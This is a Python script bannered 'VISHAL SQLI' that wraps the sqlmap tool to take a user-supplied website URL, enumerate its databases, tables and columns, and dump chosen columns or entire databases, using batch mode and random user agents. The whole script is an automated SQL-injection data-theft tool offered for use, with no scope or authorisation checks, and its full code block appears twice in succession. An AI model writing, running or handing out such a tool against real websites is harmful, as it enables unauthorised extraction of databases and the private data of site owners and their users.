
vishal = """

!                                                                
!                                                                                                                                                                                                                       
!  VVVVVVVV           VVVVVVVVIIIIIIIIII   SSSSSSSSSSSSSSS HHHHHHHHH     HHHHHHHHH               AAA               LLLLLLLLLLL                     SSSSSSSSSSSSSSS      QQQQQQQQQ     LLLLLLLLLLL             IIIIIIIIII
!  V::::::V           V::::::VI::::::::I SS:::::::::::::::SH:::::::H     H:::::::H              A:::A              L:::::::::L                   SS:::::::::::::::S   QQ:::::::::QQ   L:::::::::L             I::::::::I
!  V::::::V           V::::::VI::::::::IS:::::SSSSSS::::::SH:::::::H     H:::::::H             A:::::A             L:::::::::L                  S:::::SSSSSS::::::S QQ:::::::::::::QQ L:::::::::L             I::::::::I
!  V::::::V           V::::::VII::::::IIS:::::S     SSSSSSSHH::::::H     H::::::HH            A:::::::A            LL:::::::LL                  S:::::S     SSSSSSSQ:::::::QQQ:::::::QLL:::::::LL             II::::::II
!   V:::::V           V:::::V   I::::I  S:::::S              H:::::H     H:::::H             A:::::::::A             L:::::L                    S:::::S            Q::::::O   Q::::::Q  L:::::L                 I::::I  
!    V:::::V         V:::::V    I::::I  S:::::S              H:::::H     H:::::H            A:::::A:::::A            L:::::L                    S:::::S            Q:::::O     Q:::::Q  L:::::L                 I::::I  
!     V:::::V       V:::::V     I::::I   S::::SSSS           H::::::HHHHH::::::H           A:::::A A:::::A           L:::::L                     S::::SSSS         Q:::::O     Q:::::Q  L:::::L                 I::::I  
!      V:::::V     V:::::V      I::::I    SS::::::SSSSS      H:::::::::::::::::H          A:::::A   A:::::A          L:::::L                      SS::::::SSSSS    Q:::::O     Q:::::Q  L:::::L                 I::::I  
!       V:::::V   V:::::V       I::::I      SSS::::::::SS    H:::::::::::::::::H         A:::::A     A:::::A         L:::::L                        SSS::::::::SS  Q:::::O     Q:::::Q  L:::::L                 I::::I  
!        V:::::V V:::::V        I::::I         SSSSSS::::S   H::::::HHHHH::::::H        A:::::AAAAAAAAA:::::A        L:::::L                           SSSSSS::::S Q:::::O     Q:::::Q  L:::::L                 I::::I  
!         V:::::V:::::V         I::::I              S:::::S  H:::::H     H:::::H       A:::::::::::::::::::::A       L:::::L                                S:::::SQ:::::O  QQQQ:::::Q  L:::::L                 I::::I  
!          V:::::::::V          I::::I              S:::::S  H:::::H     H:::::H      A:::::AAAAAAAAAAAAA:::::A      L:::::L         LLLLLL                 S:::::SQ::::::O Q::::::::Q  L:::::L         LLLLLL  I::::I  
!           V:::::::V         II::::::IISSSSSSS     S:::::SHH::::::H     H::::::HH   A:::::A             A:::::A   LL:::::::LLLLLLLLL:::::L     SSSSSSS     S:::::SQ:::::::QQ::::::::QLL:::::::LLLLLLLLL:::::LII::::::II
!            V:::::V          I::::::::IS::::::SSSSSS:::::SH:::::::H     H:::::::H  A:::::A               A:::::A  L::::::::::::::::::::::L     S::::::SSSSSS:::::S QQ::::::::::::::Q L::::::::::::::::::::::LI::::::::I
!             V:::V           I::::::::IS:::::::::::::::SS H:::::::H     H:::::::H A:::::A                 A:::::A L::::::::::::::::::::::L     S:::::::::::::::SS    QQ:::::::::::Q  L::::::::::::::::::::::LI::::::::I
!              VVV            IIIIIIIIII SSSSSSSSSSSSSSS   HHHHHHHHH     HHHHHHHHHAAAAAAA                   AAAAAAALLLLLLLLLLLLLLLLLLLLLLLL      SSSSSSSSSSSSSSS        QQQQQQQQ::::QQLLLLLLLLLLLLLLLLLLLLLLLLIIIIIIIIII
!                                                                                                                                                                               Q:::::Q                                 
!                                                                                                                                                                                QQQQQQ                                 
!                                                                                                                                                                                                                       
!                                                                                                                                                                                                                       
!                                                                                                                                                                                                                       
!                                                                                                                                                                                                                       
!                                                                                                                                                                                                                       


"""

print(vishal)

import subprocess

b=input("Do you want to extract all the data at once Press (Yes) or do you want to extract the data of your choice Press (No): ")

def Choice():
    x = input("Enter Your Website Name: ")
    subprocess.run(["sqlmap", "-u", x, "--dbs", "--batch", "--random-agent"])

    y = input("Enter Your Database Name: ")
    subprocess.run(["sqlmap", "-u", x, "-D", y ,  "--tables", "--batch", "--random-agent"])

    z = input("Enter Your Table Name: ")
    subprocess.run(["sqlmap", "-u", x, "-D", y ,"-T" ,z,"--columns", "--batch", "--random-agent"])

    a = input(["Enter Your Column Name: "])
    subprocess.run(["sqlmap", "-u", x, "-D", y ,"-T" ,z, "-C", a , "--dump", "--batch", "--random-agent"])


def All():
    x = input("Enter Your Website Name: ")
    subprocess.run(["sqlmap", "-u", x, "--dbs", "--batch", "--random-agent"])

    y = input("Enter Your Database Name: ")
    subprocess.run(["sqlmap", "-u", x, "-D", y ,  "--tables", "--batch", "--random-agent"])
    subprocess.run(["sqlmap", "-u", x, "-D", y ,"--dump-all", "--batch", "--random-agent"]) 


    


if b.lower() == "yes":
    All()
elif b.upper() == "YES":
    All()
elif b.upper() == "NO":
    Choice()
elif b.lower() == "no":
    Choice()   
else:
  print(" Enter a Correct key")    
import subprocess

b=input("Do you want to extract all the data at once Press (Yes) or do you want to extract the data of your choice Press (No): ")

def Choice():
    x = input("Enter Your Website Name: ")
    subprocess.run(["sqlmap", "-u", x, "--dbs", "--batch", "--random-agent"])

    y = input("Enter Your Database Name: ")
    subprocess.run(["sqlmap", "-u", x, "-D", y ,  "--tables", "--batch", "--random-agent"])

    z = input("Enter Your Table Name: ")
    subprocess.run(["sqlmap", "-u", x, "-D", y ,"-T" ,z,"--columns", "--batch", "--random-agent"])

    a = input(["Enter Your Column Name: "])
    subprocess.run(["sqlmap", "-u", x, "-D", y ,"-T" ,z, "-C", a , "--dump", "--batch", "--random-agent"])


def All():
    x = input("Enter Your Website Name: ")
    subprocess.run(["sqlmap", "-u", x, "--dbs", "--batch", "--random-agent"])

    y = input("Enter Your Database Name: ")
    subprocess.run(["sqlmap", "-u", x, "-D", y ,  "--tables", "--batch", "--random-agent"])
    subprocess.run(["sqlmap", "-u", x, "-D", y ,"--dump-all", "--batch", "--random-agent"]) 


    


if b.lower() == "yes":
    All()
elif b.upper() == "YES":
    All()
elif b.upper() == "NO":
    Choice()
elif b.lower() == "no":
    Choice()   
else:
  print(" Enter a Correct key")    
